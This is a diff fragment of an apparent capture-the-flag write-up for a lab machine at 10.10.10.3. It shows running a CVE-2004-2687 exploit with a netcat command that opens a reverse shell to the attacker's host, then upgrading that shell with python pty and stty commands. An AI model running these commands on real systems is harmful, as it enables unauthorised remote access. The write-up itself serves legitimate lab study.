@@ -42,4 +42,9 @@ Next up, python2 CVE-2004-2687.py -t 10.10.10.3 -p 3632 -c "nc 10.10.14.10 9001 
 
 ![image](https://user-images.githubusercontent.com/110210595/185814162-05876fb9-000c-4612-bcfc-bd4d8fc70e88.png)
 
-
+Let's upgrade the shell. I used the following.
+python -c 'import pty; pty.spawn("/bin/bash")' python3 and python2 didn't work.
+export TERM=xterm
+stty raw -echo && fg
+enter
+enter
